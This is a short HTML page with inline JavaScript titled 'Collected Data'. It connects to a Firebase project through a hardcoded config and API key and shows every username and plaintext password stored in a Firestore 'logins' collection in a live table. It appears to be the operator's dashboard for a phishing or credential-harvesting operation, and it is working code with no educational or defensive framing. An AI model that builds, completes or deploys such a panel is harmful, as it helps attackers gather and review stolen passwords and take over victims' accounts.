<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Data Collection</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 20px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
    }
    th, td {
      padding: 8px;
      border: 1px solid #ddd;
    }
    th {
      background-color: #f2f2f2;
    }
  </style>
</head>
<body>
  <h1>Collected Data</h1>
  <table id="dataTable">
    <thead>
      <tr>
        <th>Username</th>
        <th>Password</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>

  <script type="module">
    // Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyAVeEjtLg68DEK-dNtAHN5JFOy1NaevVjA",
      authDomain: "my-project-1-7e614.firebaseapp.com",
      projectId: "my-project-1-7e614",
      storageBucket: "my-project-1-7e614.firebasestorage.app",
      messagingSenderId: "807664093949",
      appId: "1:807664093949:web:98b8505fa2277371938c94",
      measurementId: "G-8DFGXF1QWX"
    };

    // Initialize Firebase
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-app.js';
    import { getFirestore, collection, onSnapshot } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-firestore.js';

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // Listen for real-time updates
    onSnapshot(collection(db, "logins"), (snapshot) => {
      const tbody = document.querySelector('#dataTable tbody');
      tbody.innerHTML = '';
      
      snapshot.forEach((doc) => {
        const data = doc.data();
        const row = tbody.insertRow();
        row.insertCell().textContent = data.username;
        row.insertCell().textContent = data.password;
      });
    });
  </script>
</body>
</html>
